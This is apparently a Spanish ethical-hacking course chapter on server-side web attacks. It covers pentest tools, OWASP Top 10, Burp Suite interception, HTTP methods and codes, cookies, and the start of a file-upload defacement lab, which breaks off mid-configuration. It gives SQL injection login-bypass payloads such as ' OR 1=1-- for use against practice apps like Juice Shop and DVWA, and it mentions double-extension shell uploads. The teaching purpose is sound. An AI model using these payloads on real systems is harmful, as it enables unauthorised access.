| **Inicio**         | **atrás 18**                                    | **Siguiente 20**                                                                 |
| ------------------ | ----------------------------------------------- | -------------------------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./7_18_Hacking_Escalada_de_Privilegios.md) | [⏩](./7_20_Introduccion_a_Ciberseguridad_Prevencion_de_Ataques_Informaticos.md) |

---

## **Índice**

| Temario                                                                                                                        |
| ------------------------------------------------------------------------------------------------------------------------------ |
| [995. Herramientas Básicas para Aprender Hacking](#995-herramientas-básicas-para-aprender-hacking)                             |
| [996. OWASP: Top 10 y Testing Guide](#996-owasp-top-10-y-testing-guide)                                                        |
| [997. Burpsuite: Análisis de Solicitudes HTTP](#997-burpsuite-análisis-de-solicitudes-http)                                    |
| [998. HTTP: Métodos y Códigos de Status](#998-http-métodos-y-códigos-de-status)                                                |
| [999. Cabeceras HTTP y Cookies](#999-cabeceras-http-y-cookies)                                                                 |
| [1000. Tipos de Aplicaciones Web y Análisis de sus Tecnologías](#1000-tipos-de-aplicaciones-web-y-análisis-de-sus-tecnologías) |
| [1001. Defacement: Vulnerabilidad en File Upload](#1001-defacement-vulnerabilidad-en-file-upload)                              |
| [1002. Técnicas de File Inclusion: Local y Remote](#1002-técnicas-de-file-inclusion-local-y-remote)                            |
| [1003. Full Path Disclosure y Directory Traversal](#1003-full-path-disclosure-y-directory-traversa)                            |
| [1004. Command Injection](#1004-command-injection)                                                                             |
| [1005. SQL Injection Manual](#1005-sql-injection-manual)                                                                       |
| [1006. SQL Injection Automatizada con SQLMap](#1006-sql-injection-automatizada-con-sqlmap)                                     |

# **Hacking: Aplicaciones Web Server Side**

## **995. Herramientas Básicas para Aprender Hacking**

### 🧠 ¿Qué es el Hacking Ético?

El **hacking ético** es el uso de habilidades de hacking con fines legales y educativos. Un **hacker ético** evalúa la seguridad de sistemas, redes y aplicaciones para encontrar vulnerabilidades **antes de que los atacantes lo hagan**.

Para comenzar, necesitas **herramientas básicas** que te ayuden a practicar y entender cómo funciona la seguridad ofensiva y defensiva.

---

### 🛠️ Herramientas Básicas para Aprender Hacking

Aquí tienes una lista ordenada de las herramientas más importantes para principiantes, agrupadas por categorías.

---

#### 1. 🐧 **Kali Linux** (Sistema Operativo)

> Sistema operativo basado en Debian, especializado en pruebas de penetración.

**¿Para qué sirve?**

- Viene con +600 herramientas para pentesting
- Ideal para aprender todo en un solo lugar

**Cómo instalarlo:**

- Puedes instalarlo en VirtualBox, VMware o usarlo en modo Live USB

**Descarga desde:**
🔗 [https://www.kali.org/get-kali](https://www.kali.org/get-kali)

---

#### 2. 🧪 **Nmap** (Escaneo de red)

> Escanea redes y puertos abiertos de equipos.

**Comando básico:**

```bash
nmap -sV 192.168.1.1
```

**Instalación en Kali:**

Viene preinstalado. Si no:

```bash
sudo apt install nmap
```

---

#### 3. 🔓 **Burp Suite** (Análisis web)

> Proxy para interceptar y modificar tráfico entre el navegador y servidores web.

**¿Para qué sirve?**

- Ideal para aprender ataques como SQL Injection, XSS, CSRF.

**Uso típico:**

Interceptas un formulario de login y modificas los datos antes de que se envíen.

**Instalación en Kali:**

```bash
sudo apt install burpsuite
```

O usa la versión Community:

🔗 [https://portswigger.net/burp](https://portswigger.net/burp)

---

#### 4. 🐚 **Metasploit Framework** (Explotación)

> Plataforma para desarrollar y ejecutar exploits.

**Comando para iniciar:**

```bash
msfconsole
```

**Instalación:**

Ya viene con Kali. Si no, en Ubuntu:

```bash
sudo apt install metasploit-framework
```

---

#### 5. 🦠 **Wireshark** (Análisis de tráfico de red)

> Sniffer que captura paquetes de red para analizarlos.

**¿Para qué sirve?**

- Ver tráfico claro (como contraseñas no cifradas)
- Diagnosticar ataques o fugas de datos

**Instalación:**

```bash
sudo apt install wireshark
```

---

#### 6. 🔍 **Nikto** (Escáner de vulnerabilidades web)

> Escanea servidores web en busca de vulnerabilidades conocidas.

**Uso básico:**

```bash
nikto -h http://192.168.1.10
```

**Instalación:**

```bash
sudo apt install nikto
```

---

#### 7. 🐍 **Python y Bash** (Scripting)

> Lenguajes esenciales para escribir tus propios scripts de ataque y automatización.

**Comando para probar en Kali:**

```bash
python3 -c 'print("Hola hacker")'
```

---

#### 8. 🧠 **TryHackMe y HackTheBox** (Laboratorios virtuales)

> Plataformas para practicar hacking en entornos reales y seguros.

**Regístrate gratis:**

- 🔗 [https://tryhackme.com](https://tryhackme.com)
- 🔗 [https://hackthebox.com](https://hackthebox.com)

---

### 9. 🔎 **LinPEAS / WinPEAS** (Escalada de privilegios)

> Scripts que analizan Linux/Windows para encontrar formas de obtener privilegios de administrador/root.

---

### 🧪 Ejemplo Completo: Reconocimiento y ataque básico con Nmap y Nikto

#### 🎯 Escenario:

Tu red tiene un servidor vulnerable en `192.168.1.100`. Quieres encontrar vulnerabilidades web.

---

#### ✅ Paso 1: Escaneo con Nmap

```bash
nmap -sV 192.168.1.100
```

📋 Resultado:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache 2.4.29
```

---

#### ✅ Paso 2: Escaneo con Nikto

```bash
nikto -h http://192.168.1.100
```

📋 Resultado:

```
+ Server leaks inodes via ETags, header found with file /index.html
+ The anti-clickjacking X-Frame-Options header is not present.
+ Apache/2.4.29 appears to be outdated.
```

🔴 ¡Nikto detectó que el servidor es vulnerable! Ahora puedes investigar más sobre las fallas del Apache 2.4.29 o intentar una explotación con Metasploit (avanzado).

---

### ✅ Recomendaciones finales para comenzar

| Recurso                       | ¿Por qué es útil?                                   |
| ----------------------------- | --------------------------------------------------- |
| Kali Linux                    | Sistema base para pruebas                           |
| Nmap, Nikto, Burp, Metasploit | Herramientas para cada fase del hacking             |
| Python/Bash                   | Para automatizar tareas                             |
| TryHackMe/HackTheBox          | Para practicar en un entorno seguro                 |
| Notas                         | Toma apuntes, usa markdown y guarda comandos útiles |

---

[🔼](#índice)

---

## **996. OWASP: Top 10 y Testing Guide**

### 🔍 ¿Qué es OWASP?

**OWASP (Open Worldwide Application Security Project)** es una comunidad global que produce recursos gratuitos para mejorar la seguridad de software. Es muy conocida por dos de sus principales proyectos:

#### 🧱 1. **OWASP Top 10**

Una lista de las 10 **vulnerabilidades más críticas** en aplicaciones web, basada en investigaciones reales.

#### 🧪 2. **OWASP Testing Guide**

Un manual que enseña **cómo probar aplicaciones web paso a paso**, siguiendo buenas prácticas para encontrar vulnerabilidades.

---

### ✅ ¿Por qué son importantes?

- Son estándares usados por **empresas, desarrolladores y hackers éticos**.
- Si quieres trabajar en ciberseguridad web, **debes dominar el Top 10 y la Testing Guide**.

---

### 📚 Parte 1: OWASP Top 10 (2021)

Aquí te explico de forma sencilla cada categoría con un ejemplo:

| Nº  | Vulnerabilidad                                 | Ejemplo simple                                         |
| --- | ---------------------------------------------- | ------------------------------------------------------ |
| 1   | **Broken Access Control**                      | Un usuario normal accede a `/admin` sin permiso        |
| 2   | **Cryptographic Failures**                     | Contraseñas sin cifrado en la base de datos            |
| 3   | **Injection (SQL, etc.)**                      | `admin'--` en un login para saltarse la autenticación  |
| 4   | **Insecure Design**                            | Aplicación permite cambiar precios desde el cliente    |
| 5   | **Security Misconfiguration**                  | Base de datos expuesta al público                      |
| 6   | **Vulnerable Components**                      | Uso de librerías desactualizadas (como jQuery viejo)   |
| 7   | **Identification and Authentication Failures** | Login sin bloqueo tras varios intentos fallidos        |
| 8   | **Software and Data Integrity Failures**       | Descarga de actualizaciones sin verificación           |
| 9   | **Security Logging and Monitoring Failures**   | No se registran ataques o accesos sospechosos          |
| 10  | **Server-Side Request Forgery (SSRF)**         | El servidor es engañado para hacer peticiones internas |

🧠 **Meta:** Aprender qué hace vulnerable una app web y cómo explotarlo o protegerla.

---

### 📘 Parte 2: OWASP Testing Guide

Es un **manual oficial** con técnicas para probar la seguridad de una aplicación. Incluye:

- **Test de autenticación** (¿puedo iniciar sesión sin credenciales?)
- **Test de autorización** (¿puedo ver cosas que no debería?)
- **Test de lógica de negocio** (¿puedo comprar algo a 0 soles?)
- **Test de inyecciones** (¿puedo inyectar código en formularios?)

📘 Puedes leerlo online aquí:
🔗 [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)

También puedes descargarlo en PDF.

---

### 💻 ¿Cómo se instala el OWASP Testing Guide?

No es una herramienta, sino una **guía que puedes seguir paso a paso**. Pero puedes instalar entornos de práctica con vulnerabilidades basadas en OWASP.

#### ✅ Opción 1: OWASP Juice Shop

> Aplicación web vulnerable diseñada para practicar todas las fallas del OWASP Top 10.

#### 🧪 Cómo instalar OWASP Juice Shop (usando Docker)

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Luego visita en tu navegador:
📍 `http://localhost:3000`

---

#### ✅ Opción 2: OWASP Broken Web Apps (máquina virtual)

Un paquete con decenas de apps vulnerables.

🔗 [https://sourceforge.net/projects/owaspbwa/](https://sourceforge.net/projects/owaspbwa/)

---

### 🧪 Ejemplo completo paso a paso: SQL Injection en OWASP Juice Shop

#### 🎯 Escenario:

Vas a usar OWASP Juice Shop en tu máquina local para probar un login vulnerable a SQL Injection.

#### ✅ Paso 1: Instalar Juice Shop (Docker)

```bash
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

#### ✅ Paso 2: Abre en navegador

Ir a `http://localhost:3000`

#### ✅ Paso 3: Usar payload de SQL Injection en el login

Usuario:

```
' OR 1=1--
```

Contraseña:

```
cualquiercosa
```

✅ Resultado: ¡Ingresaste sin conocer las credenciales!

Este es un caso real del **Top 10 (Injection)** que puedes explotar y luego parchear.

---

### 🎓 Conclusión

#### 🧰 Herramientas que puedes usar junto al OWASP Testing Guide:

| Herramienta     | ¿Para qué sirve?                            |
| --------------- | ------------------------------------------- |
| Burp Suite      | Interceptar tráfico y modificar solicitudes |
| OWASP ZAP       | Alternativa a Burp, desarrollada por OWASP  |
| SQLmap          | Automatiza ataques de SQL Injection         |
| Nikto           | Escanea vulnerabilidades básicas web        |
| Postman         | Probar APIs manualmente                     |
| LinPEAS/WinPEAS | Ver escalada de privilegios en backend      |
| Nmap            | Detección de servicios expuestos            |

---

[🔼](#índice)

---

## **997. Burpsuite: Análisis de Solicitudes HTTP**

### 🔍 ¿Qué es **Burp Suite**?

**Burp Suite** es una herramienta profesional de **interceptación, análisis y manipulación de solicitudes HTTP(S)** entre el navegador y el servidor. Te permite encontrar vulnerabilidades como:

- SQL Injection
- XSS
- Broken Access Control
- CSRF
- Fuzzing (ataques automáticos)
- Login Bypass
- … ¡y mucho más!

🧰 Incluye:

- **Proxy**: intercepta tráfico web.
- **Repeater**: reenvía y edita solicitudes.
- **Intruder**: pruebas automatizadas (fuerza bruta, fuzzing).
- **Decoder** y **Comparer**: para analizar y comparar datos.
- **Scanner** (solo versión Pro): escaneo automático de vulnerabilidades.

---

### 🧱 ¿Cómo se instala Burp Suite?

#### ✅ Opción 1: Usar en Kali Linux (ya viene preinstalado)

```bash
burpsuite
```

#### ✅ Opción 2: Instalar en Windows/Mac/Linux manualmente

1. Ir al sitio oficial:
   👉 [https://portswigger.net/burp](https://portswigger.net/burp)

2. Descargar **Burp Suite Community Edition (gratis)**

3. Instalar como cualquier programa normal.

---

### 🌐 Configurar navegador para usar Burp Suite

Para interceptar tráfico necesitas configurar tu navegador para que use **Burp como proxy**.

### Paso 1: Abrir Burp y activar el proxy

- Abre Burp Suite → Tab **Proxy** → sub-tab **Intercept** → Activar botón “Intercept is on”.
- Por defecto, Burp escucha en `127.0.0.1:8080`

### Paso 2: Configurar navegador (por ejemplo Firefox)

1. Ir a: `about:preferences` → General → Proxy
2. Seleccionar: **Configuración manual del proxy**

   - **HTTP Proxy**: `127.0.0.1`
   - **Puerto**: `8080`

3. Marcar: "Usar este proxy para todos los protocolos"
4. Guardar.

---

### 🔐 Evitar problemas HTTPS (SSL/TLS)

Burp usa un **certificado intermedio** para interceptar tráfico HTTPS. Para que el navegador no lo bloquee:

1. Visita en el navegador: `http://burpsuite`
2. Descarga el certificado: `CA Certificate`
3. Instálalo como certificado de confianza en tu navegador.

---

### 🛠️ Cómo analizar solicitudes HTTP con Burp

Una vez interceptado el tráfico web, puedes hacer lo siguiente:

#### 🧪 Ejemplo de análisis básico

Supongamos que estás iniciando sesión en un sitio vulnerable:

1. En el navegador, llenas el formulario:

   - Usuario: `admin`
   - Contraseña: `123456`

2. Burp captura esto como solicitud:

```
POST /login HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

username=admin&password=123456
```

#### ¿Qué puedes hacer?

- Cambiar el `username` o `password` antes de enviarlo.
- Enviar la solicitud varias veces con diferentes datos (ataques).
- Repetir solicitudes sin reescribir (con **Repeater**).
- Lanzar pruebas automáticas con **Intruder**.

---

### 🧪 Ejemplo completo paso a paso

#### 🎯 Objetivo: Interceptar y modificar un login para probar si es vulnerable a SQL Injection

##### 1. Instala Burp Suite y configúralo como proxy

##### 2. Visita un sitio vulnerable (como [DVWA](https://github.com/digininja/DVWA) o [Juice Shop](https://github.com/juice-shop/juice-shop))

##### 3. En la página de login, escribe cualquier dato:

- Usuario: `' OR 1=1--`
- Contraseña: `cualquier cosa`

##### 4. Burp capturará esto:

```
POST /login HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1--&password=test
```

##### 5. En **Proxy → HTTP history**, haz clic derecho → "Send to Repeater".

##### 6. En **Repeater**, puedes modificar y volver a enviar la solicitud.

##### 7. Observa si la respuesta cambia (por ejemplo: “Bienvenido admin”).

---

### 🎓 ¿Qué se logra con esto?

- Ver si una app es vulnerable a manipulación de datos.
- Entender el flujo de autenticación.
- Identificar parámetros que pueden ser explotados.
- Repetir pruebas sin llenar formularios cada vez.

---

### ✅ Conclusión

#### Burp Suite te permite:

- Interceptar, visualizar y modificar solicitudes HTTP/HTTPS.
- Hacer pruebas de fuzzing y fuerza bruta (Intruder).
- Automatizar ataques (versión Pro).
- Estudiar en profundidad cómo funciona una app web.

---

[🔼](#índice)

---

## **998. HTTP: Métodos y Códigos de Status**

### 🌐 ¿Qué es HTTP?

**HTTP (Hypertext Transfer Protocol)** es el protocolo que los navegadores web y los servidores utilizan para comunicarse. Cada vez que visitas una página web, tu navegador (cliente) hace una **solicitud HTTP** al servidor, y el servidor responde con una **respuesta HTTP**.

---

### 📦 ¿Se instala HTTP?

No necesitas instalar HTTP como tal porque **ya está incorporado en navegadores y servidores web**. Sin embargo, para hacer pruebas o aprender puedes usar:

#### Opcional: Instalar herramientas para probar solicitudes HTTP

- **Postman** (interfaz gráfica)
- **cURL** (línea de comandos)
- **Burp Suite** (para pruebas de seguridad)
- **Python + requests** (para programadores)

---

### 🛠️ MÉTODOS HTTP (Verbos HTTP)

Los métodos HTTP indican **la acción** que el cliente quiere hacer sobre un recurso.

| Método      | Propósito                                 | Ejemplo                    |
| ----------- | ----------------------------------------- | -------------------------- |
| **GET**     | Solicitar datos                           | Ver una página web         |
| **POST**    | Enviar datos                              | Enviar formulario de login |
| **PUT**     | Actualizar datos existentes               | Editar perfil              |
| **DELETE**  | Eliminar recursos                         | Borrar un post             |
| **PATCH**   | Modificar parcialmente                    | Cambiar solo el email      |
| **OPTIONS** | Preguntar qué métodos permite el servidor | Ver configuración          |
| **HEAD**    | Obtener solo cabeceras                    | Verificar si hay cambios   |

#### 🔍 Ejemplo de solicitud GET:

```
GET /productos HTTP/1.1
Host: tienda.com
```

#### 🔍 Ejemplo de solicitud POST:

```
POST /login HTTP/1.1
Host: tienda.com
Content-Type: application/x-www-form-urlencoded

usuario=gustavo&clave=1234
```

---

### 🧾 CÓDIGOS DE ESTADO (Status Codes)

Los **códigos de estado** indican el resultado de la solicitud HTTP. Son enviados por el servidor al cliente.

#### 📚 Categorías principales:

| Código  | Categoría          | Significado        |
| ------- | ------------------ | ------------------ |
| **1xx** | Informativo        | Procesando         |
| **2xx** | Éxito              | Todo OK            |
| **3xx** | Redirección        | Recurso movido     |
| **4xx** | Error del cliente  | Mala solicitud     |
| **5xx** | Error del servidor | Fallo del servidor |

#### 📘 Códigos más comunes:

##### ✅ **2xx – Éxito**

- **200 OK**: Todo funcionó.
- **201 Created**: Recurso creado (POST exitoso).
- **204 No Content**: Éxito sin respuesta.

##### 🔄 **3xx – Redirecciones**

- **301 Moved Permanently**: URL cambió para siempre.
- **302 Found**: URL temporalmente redirigida.

##### ❌ **4xx – Errores del Cliente**

- **400 Bad Request**: Sintaxis mal formada.
- **401 Unauthorized**: Falta autenticación.
- **403 Forbidden**: Acceso denegado.
- **404 Not Found**: No encontrado.
- **405 Method Not Allowed**: Método no permitido.

##### ⚠️ **5xx – Errores del Servidor**

- **500 Internal Server Error**: Error general del servidor.
- **502 Bad Gateway**: Error en la puerta de enlace.
- **503 Service Unavailable**: Servicio caído.

---

### 💻 Cómo hacer pruebas de métodos y códigos HTTP

#### ✅ Opción 1: Usar **Postman** (interfaz gráfica)

1. Descarga desde: [https://www.postman.com/](https://www.postman.com/)
2. Crear nueva solicitud → Elegir método (GET, POST…)
3. Ingresar URL: `https://jsonplaceholder.typicode.com/posts`
4. Haz clic en **Send**
5. Verás el cuerpo de la respuesta y el código de estado (ej: `200 OK`)

---

#### ✅ Opción 2: Usar **cURL** (línea de comandos)

```bash
curl -i https://jsonplaceholder.typicode.com/posts
```

Salida esperada:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
...
[ { "userId": 1, "id": 1, "title": "...", ... } ]
```

---

### 🧪 EJEMPLO COMPLETO: Simulación de formulario login

#### 🎯 Escenario: Usuario quiere iniciar sesión

1. El navegador hace una solicitud POST:

```http
POST /login HTTP/1.1
Host: ejemplo.com
Content-Type: application/x-www-form-urlencoded

username=gustavo&password=123456
```

2. El servidor responde:

✅ Si es exitoso:

```
HTTP/1.1 200 OK
Content-Type: text/html

Bienvenido Gustavo
```

❌ Si falla:

```
HTTP/1.1 401 Unauthorized
Content-Type: text/html

Usuario o clave incorrectos
```

3. Si el usuario intenta acceder a `/admin` sin estar logueado:

```
HTTP/1.1 403 Forbidden
```

4. Si la URL no existe:

```
HTTP/1.1 404 Not Found
```

---

### 🧠 Conclusión

| Concepto                | Función                                |
| ----------------------- | -------------------------------------- |
| **Métodos HTTP**        | Indican lo que el cliente quiere hacer |
| **Códigos de estado**   | Indican cómo respondió el servidor     |
| **Herramientas útiles** | Postman, cURL, Burp, Python            |

---

[🔼](#índice)

---

## **999. Cabeceras HTTP y Cookies**

![Cabeceras HTTP](../img/7_Ciberseguridad_Profesional/Cabeceras_HTTP_%20Cookies.jpg "Cabeceras HTTP")

### 🌐 ¿Qué son las **Cabeceras HTTP**?

Las **cabeceras HTTP (HTTP headers)** son fragmentos de información clave que se envían junto con las solicitudes o respuestas HTTP. Informan al servidor o al cliente **cómo debe tratar la información** que se está enviando o recibiendo.

---

#### 📦 Tipos de cabeceras HTTP

Hay dos grandes grupos:

1. **Cabeceras de solicitud**: las envía el cliente (navegador o herramienta como Postman).
2. **Cabeceras de respuesta**: las envía el servidor de vuelta al cliente.

---

#### 🧾 Ejemplos de cabeceras comunes

##### 👉 Cabeceras de Solicitud (Request headers):

| Cabecera        | Qué hace                       | Ejemplo                       |
| --------------- | ------------------------------ | ----------------------------- |
| `Host`          | Indica el dominio              | `Host: www.ejemplo.com`       |
| `User-Agent`    | Identifica navegador o cliente | `Mozilla/5.0`                 |
| `Accept`        | Qué tipos de contenido acepta  | `text/html, application/json` |
| `Authorization` | Token de acceso                | `Bearer eyJ...`               |
| `Cookie`        | Envía cookies al servidor      | `Cookie: token=abc123`        |

##### 👉 Cabeceras de Respuesta (Response headers):

| Cabecera        | Qué hace                | Ejemplo                                      |
| --------------- | ----------------------- | -------------------------------------------- |
| `Content-Type`  | Tipo de contenido       | `application/json`                           |
| `Set-Cookie`    | Define una cookie nueva | `Set-Cookie: token=abc123; Path=/; HttpOnly` |
| `Location`      | Redirección             | `Location: /login`                           |
| `Cache-Control` | Instrucciones de cache  | `no-cache`                                   |

---

### 🍪 ¿Qué son las **Cookies**?

Las **cookies** son pequeños archivos que el servidor envía al navegador para **almacenar información del usuario**. Se usan para:

- Recordar sesiones (ej. cuando inicias sesión).
- Almacenar preferencias del usuario.
- Hacer seguimiento (tracking).

---

### 🔁 Ciclo básico de una cookie

1. El servidor envía la cookie en la **respuesta**:

```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; Path=/; HttpOnly
```

2. El navegador guarda la cookie y la **envía en futuras solicitudes**:

```http
GET /perfil HTTP/1.1
Host: ejemplo.com
Cookie: session_id=abc123
```

---

### ⚙️ ¿Cómo se configuran o "instalan"?

No se instalan como un software, pero puedes **crear, leer y manipular cabeceras y cookies** con herramientas o código:

#### 🧪 Opciones para probar y ver cabeceras/cookies:

| Herramienta                                    | Qué hace                          |
| ---------------------------------------------- | --------------------------------- |
| Postman                                        | Ver y editar cabeceras fácilmente |
| Inspección del navegador (F12) → Red (Network) | Ver cookies y cabeceras           |
| curl (línea de comandos)                       | Enviar solicitudes con cabeceras  |
| Python / JavaScript                            | Crear cookies o leer cabeceras    |

---

### 🧪 Prueba usando cURL

#### 👉 Enviar cabecera personalizada:

```bash
curl -H "X-Usuario: Gustavo" https://httpbin.org/headers
```

#### 👉 Ver cookies que responde el servidor:

```bash
curl -I https://httpbin.org/cookies/set?token=abc123
```

---

### 💻 Prueba con JavaScript en navegador:

```js
document.cookie = "idioma=es; path=/";
console.log(document.cookie); // idioma=es
```

---

### 💡 Seguridad con cookies

| Opción     | Explicación                                      |
| ---------- | ------------------------------------------------ |
| `HttpOnly` | No accesible por JavaScript (protege contra XSS) |
| `Secure`   | Solo se envía por HTTPS                          |
| `SameSite` | Protege contra CSRF (ej. `SameSite=Lax`)         |

---

### ✅ EJEMPLO COMPLETO: Simulación de Login con Cookies

#### 📁 Paso 1: Crear un servidor en Python que use cookies

```python
# archivo: server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Set-Cookie", "session_id=abc123; HttpOnly")
            self.end_headers()
            self.wfile.write(b"<h1>Cookie enviada</h1>")
        elif self.path == "/perfil":
            cookie = self.headers.get("Cookie")
            if cookie == "session_id=abc123":
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"<h1>Bienvenido de nuevo, Gustavo</h1>")
            else:
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b"<h1>Acceso Denegado</h1>")

httpd = HTTPServer(("localhost", 8000), SimpleHandler)
print("Servidor en http://localhost:8000")
httpd.serve_forever()
```

#### ▶️ Ejecutar:

```bash
python3 server.py
```

#### 🔍 Probar:

1. Ir a `http://localhost:8000/` → envía cookie
2. Luego ir a `http://localhost:8000/perfil` → si tienes la cookie, accedes; si no, denegado.

---

### 🧠 Conclusión

| Concepto            | Función                                       |
| ------------------- | --------------------------------------------- |
| Cabeceras HTTP      | Instrucciones extra en solicitudes/respuestas |
| Cookies             | Guardan datos entre sesiones                  |
| Herramientas útiles | Postman, navegador, curl, código              |
| Seguridad           | Usa `HttpOnly`, `Secure`, `SameSite`          |

---

[🔼](#índice)

---

## **1000. Tipos de Aplicaciones Web y Análisis de sus Tecnologías**

### 🧩 ¿Qué es una Aplicación Web?

Una **aplicación web** es un programa que se ejecuta en un servidor y los usuarios lo utilizan desde un navegador (Chrome, Firefox, etc.). A diferencia del software tradicional, **no necesitas instalar nada en tu PC** para usarla.

---

### 🔢 Tipos de Aplicaciones Web

| Tipo                         | Descripción breve                             | Ejemplo real                 |
| ---------------------------- | --------------------------------------------- | ---------------------------- |
| 1. Sitio web estático        | Solo muestra contenido fijo (HTML, CSS)       | Página informativa           |
| 2. Aplicación web dinámica   | Contenido cambia según el usuario o datos     | Facebook, Twitter            |
| 3. SPA (Single Page App)     | Una sola página que se actualiza sin recargar | Gmail, Trello                |
| 4. PWA (Progressive Web App) | Web que se comporta como app móvil            | Twitter Lite, Uber PWA       |
| 5. Aplicación CMS            | Administrable por panel sin código            | WordPress                    |
| 6. Aplicación E-commerce     | Venta de productos en línea                   | Amazon, Mercado Libre        |
| 7. Aplicación híbrida        | Web envuelta como app móvil                   | Instagram App (React Native) |

---

### 🔍 Análisis de sus Tecnologías

A continuación te muestro las tecnologías más comunes para cada tipo.

---

#### 🔹 1. **Sitio Web Estático**

**Tecnologías:**

- HTML
- CSS
- A veces JavaScript (para efectos visuales)

**Instalación/Despliegue:**

- Puedes usar GitHub Pages o subir los archivos a un hosting como Vercel o Netlify.

**Ejemplo simple:**

```html
<!-- index.html -->
<h1>Hola, soy Gustavo</h1>
<p>Este es mi portafolio web estático.</p>
```

---

#### 🔹 2. **Aplicación Web Dinámica**

**Tecnologías:**

- HTML, CSS, JavaScript
- Backend: PHP, Node.js, Python Flask/Django
- Base de datos: MySQL, PostgreSQL, MongoDB

**Instalación:**

```bash
# Ejemplo con Node.js y Express
npm install express
```

**Ejemplo de backend:**

```js
// app.js
const express = require("express");
const app = express();
app.get("/", (req, res) => res.send("Hola dinámico, Gustavo!"));
app.listen(3000);
```

---

#### 🔹 3. **SPA (Single Page Application)**

**Tecnologías:**

- Frontend: React, Vue, Angular
- Backend API: Express, Laravel, Spring Boot

**Instalación (con React):**

```bash
npx create-react-app mi-spa
```

**Ventajas:**

- Interactividad fluida
- No hay recargas de página

---

#### 🔹 4. **PWA (Progressive Web App)**

**Tecnologías:**

- HTML, CSS, JS
- Service Workers
- Manifest.json

**Cómo se instala:**

- Se "instala" desde el navegador móvil como si fuera una app (por ejemplo en Chrome: "Agregar a pantalla de inicio").

**Ejemplo de `manifest.json`:**

```json
{
  "name": "App de Gustavo",
  "start_url": "/",
  "display": "standalone",
  "icons": [{ "src": "icon.png", "sizes": "192x192", "type": "image/png" }]
}
```

---

#### 🔹 5. **Aplicación con CMS**

**Tecnologías:**

- WordPress (PHP + MySQL)
- Joomla, Drupal

**Cómo se instala:**

- Usando XAMPP o un hosting con soporte PHP/MySQL
- Descomprimir y configurar WordPress

**Ventajas:**

- Ideal para blogs o tiendas sin saber programar

---

#### 🔹 6. **Aplicación de E-commerce**

**Tecnologías:**

- CMS: WooCommerce, Shopify
- Full stack: MERN (MongoDB, Express, React, Node), Laravel

**Instalación básica de Shopify:**

- Solo necesitas una cuenta
- Arrastras elementos y agregas productos desde el panel

---

#### 🔹 7. **Aplicación Híbrida (Web + App móvil)**

**Tecnologías:**

- React Native
- Flutter (Dart)
- Ionic

**Cómo se instala (React Native):**

```bash
npx create-expo-app mi-app
cd mi-app
npx expo start
```

**Ventajas:**

- Una sola base de código para Android, iOS y Web

---

### ✅ Ejemplo Completo: Mini Aplicación Web Dinámica con Login

Usaremos:

- **Node.js + Express**
- **HTML básico**
- **Cookies simples (sin base de datos para simplificar)**

#### 1️⃣ Crear estructura:

```
miapp/
├── app.js
├── public/
│   └── login.html
```

---

#### 2️⃣ Código de `app.js`

```js
const express = require("express");
const app = express();
const path = require("path");

app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => res.send("Bienvenido a la App Web de Gustavo"));
app.get("/login", (req, res) =>
  res.sendFile(path.join(__dirname, "public/login.html"))
);

app.post("/login", (req, res) => {
  const { usuario, password } = req.body;
  if (usuario === "admin" && password === "1234") {
    res.send("Login exitoso, ¡bienvenido Gustavo!");
  } else {
    res.send("Credenciales incorrectas");
  }
});

app.listen(3000, () => console.log("Servidor en http://localhost:3000"));
```

---

#### 3️⃣ Código HTML `login.html`

```html
<form method="POST" action="/login">
  <input type="text" name="usuario" placeholder="Usuario" required />
  <input type="password" name="password" placeholder="Contraseña" required />
  <button type="submit">Iniciar sesión</button>
</form>
```

---

#### ▶️ Ejecutar:

```bash
node app.js
```

Accede a `http://localhost:3000/login`, ingresa:

- Usuario: `admin`
- Contraseña: `1234`

---

### 🧠 Conclusión

| Tipo de App | Tecnologías Clave          | Recomendado para...       |
| ----------- | -------------------------- | ------------------------- |
| Estática    | HTML, CSS                  | Sitios simples            |
| Dinámica    | Node.js, PHP               | Apps personalizadas       |
| SPA         | React, Vue                 | Apps muy interactivas     |
| PWA         | JS + Service Workers       | Apps que simulan móviles  |
| CMS         | WordPress                  | Blogs, tiendas sin código |
| E-commerce  | WooCommerce, Shopify, MERN | Tiendas                   |
| Híbrida     | React Native, Flutter      | Web + app móvil           |

---

[🔼](#índice)

---

## **1001. Defacement: Vulnerabilidad en File Upload**

### 🛑 ¿Qué es un Defacement?

El **Defacement** (desfiguración) es un tipo de ataque donde el atacante **modifica el contenido visual de un sitio web**, normalmente para mostrar un mensaje, imagen o texto no autorizado.
🔴 Generalmente ocurre cuando el atacante **sube un archivo malicioso** (por ejemplo, un script PHP) y lo ejecuta en el servidor.

---

### 📂 ¿Qué es la vulnerabilidad de File Upload?

Es una falla en aplicaciones web donde el usuario **puede subir archivos sin restricciones adecuadas**, lo que permite:

- Subir **scripts ejecutables** (`.php`, `.jsp`, `.asp`)
- Subir archivos **con doble extensión**: `shell.php.jpg`
- Cambiar el nombre o contenido del archivo para **engañar al sistema**

Una vez subido, si el servidor permite **acceso directo al archivo**, el atacante puede **ejecutar código malicioso** y hacer un **Defacement** o incluso una **escalada de privilegios**.

---

### 🔧 Instalación de un entorno vulnerable para pruebas

Vamos a usar una máquina virtual vulnerable llamada **DVWA (Damn Vulnerable Web Application)**.

#### ✅ Requisitos

- Sistema operativo con soporte para Docker (Linux, Windows, WSL)
- Docker y Docker Compose instalados

#### 🐳 Instalación con Docker

```bash
# Clonar DVWA
git clone https://github.com/digininja/DVWA.git
cd DVWA

# Crear un archivo docker-compose.yml
nano docker-compose.yml
```

#### Contenido de `docker-compose.yml`:

```yaml
version: "3"
services:
  dvwa:
